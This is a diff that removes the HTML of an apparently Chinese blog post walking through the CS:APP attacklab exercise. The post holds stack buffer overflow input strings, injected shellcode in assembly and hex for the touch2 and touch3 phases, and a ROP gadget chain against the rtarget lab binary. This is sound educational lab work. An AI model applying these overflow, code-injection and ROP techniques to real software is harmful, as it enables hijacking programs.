-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2021-02-14 16:39:04 / Modified: 23:06:15" itemprop="dateCreated datePublished" datetime="2021-02-14T16:39:04+08:00">2021-02-14</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>title: attacklab<br>date: 2021-02-14 16:38:42<br>tags:</p>
-<h2 id="attacklab"><a href="#attacklab" class="headerlink" title="attacklab"></a>attacklab</h2><p><img src="https://img-blog.csdnimg.cn/20210214114034289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>缓冲区大小 0x28</p>
-<p>返回地址转到touch1处</p>
-<p>输入0x28字节填满缓冲区，返回地址填入c0 17 40 00</p>
-<p>11 11 11 11（这里是四个字节）前面0x28随便填，最后是c0 17 40 00</p>
-<blockquote>
-<p>The program HEX2RAW will enable you to generate these raw strings. </p>
-<p> HEX2RAW expects two-digit hex values separated by one or more white spaces. So if you want to<br>create a byte with a hex value of 0, you need to write it as 00. To create the word 0xdeadbeef<br>you should pass “ef be ad de” to HEX2RAW (note the reversal required for little-endian byteordering).</p>
-<p>unix&gt; ./hex2raw &lt; ctarget.l2.txt | ./ctarget</p>
-</blockquote>
-<p>touch2：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210214111115315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>函数的第一个参数在寄存器%rdi中传递，应该注入代码使得寄存器设置为cookie的值，然后ret到touch2的首条指令。</p>
-<p>我的cookie=0x59b997fa</p>
-<p>mov    $0x59b997fa,%rdi//设置寄存器以便判断中进入val==cookie的条件语句中。</p>
-<p>pushq  $0x4017ec //touch2的地址压栈以便ret</p>
-<p>ret</p>
-<p><img src="https://img-blog.csdnimg.cn/20210214111142380.png" alt="在这里插入图片描述"></p>
-<p>mov    $0x59b997fa,%rdi</p>
-<p>pushq  $0x4017ec</p>
-<p>ret<br><img src="https://img-blog.csdnimg.cn/2021021411120087.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210214111212873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>48 c7 c7 97 bf b9 59<br>68 ec 17 40 00<br>c3</p>
-<p>和level1一样是40个字节的缓冲区大小，代码的最后ret应该填写rsp，转而去执行我们的代码。在getbuf处下断点，run -q 查看rsp的值。</p>
-<p><img src="https://img-blog.csdnimg.cn/20210214111246269.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210214111301844.png" alt="在这里插入图片描述"></p>
-<blockquote>
-<p>一开始打第一句getbuf的断点，出来的rsp是a0，总是通过不了，后面发现断点打错了。。是78.</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210214112322830.png" alt="在这里插入图片描述"></p>
-<p>​                       </p>
-<p>48 c7 c7 fa 97 b9 59 68 ec 17  40 00 c3 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 00 00  78 dc 61 55 00 00 00 00      </p>
-<blockquote>
-<p>./hex2raw -i touch2.txt | ./ctarget -q    来验证。<br><img src="https://img-blog.csdnimg.cn/20210214112055849.png" alt="在这里插入图片描述"></p>
-</blockquote>
-<p>touch3：</p>
-<p>0x59b997fa的ASCII：35 39 62 39 39 37 66 61 00</p>
-<p><img src="https://img-blog.csdnimg.cn/20210214111329623.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210214111344111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>传入touch3的参数是一个字符串的首地址，这个地址指向的字符串应该要与cookie的字符串表示相同。</p>
-<p>cookie存放的位置需要注意，调用的hexmacth里面的数组或许会把cookie覆盖。</p>
-<p>//这里一直进不去hexmatch。。不找里面不变的空间，看了别的博客发现可以开辟空间，造个栈。<br><img src="https://img-blog.csdnimg.cn/20210214113110479.png" alt="在这里插入图片描述"></p>
-<p>movq $0x5561dc93,%rdi<br>sub $0x28,%rsp<br>pushq $0x4018fa<br>retq</p>
-<p>48 c7 c7 93 dc 61 55 48<br>83 ec 28 68 fa 18 40 00<br>c3 00 00 00 00 00 00 00<br>00 00 00 35 39 62 39 39<br>37 66 61 00 00 00 00 00<br>78 dc 61 55</p>
-<blockquote>
-<p>./hex2raw -i touch3.txt | ./ctarget -q    来验证。</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210214112512736.png" alt="在这里插入图片描述"><br>rtarget–touch2</p>
-<blockquote>
-<p>For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your<br>gadget farm. </p>
-</blockquote>
-<p>目标：依然是跳到touch2，然后完成匹配cookie。<br>ctarget的汇编：</p>
-<blockquote>
-<p>mov    $0x59b997fa,%rdi</p>
-<p>pushq  $0x4017ec</p>
-<p>ret</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210214132736976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>实验手册的机器码和汇编代码的对应。<br>看看有没有pop rdi–5f<br><img src="https://img-blog.csdnimg.cn/20210214140814536.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210214132940987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>发现没有，看看其他的pop有没有。发现只有58有三个。决定从rax和rdi之间的关系入手。<br><img src="https://img-blog.csdnimg.cn/20210214133509885.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210214133524382.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210214133540880.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210214133725906.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210214133733498.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021021413374237.png" alt="在这里插入图片描述"><br>mov rax,rdi也有三个。</p>
-<p>需要gadgets为<br>mov rax,rdi<br>pop rdi<br>ret<br>因此找到0x4019ab和0x4019c6(这几个中随便选的)<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00//40垃圾数据<br>ab 19 40 00 00 00 00 00//ret进pop rax  将cookie赋给rax<br>fa 97 b9 59 00 00 00 00<br>c6 19 40 00 00 00 00 00//后一个pop rax里的ret进入mov<br>ec 17 40 00 00 00 00 00//mov的ret最后返回touch2</p>
-<blockquote>
-<p>验证：           ./hex2raw -i level4.txt | ./rtarget -q </p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210214135735612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 
       
     </div>
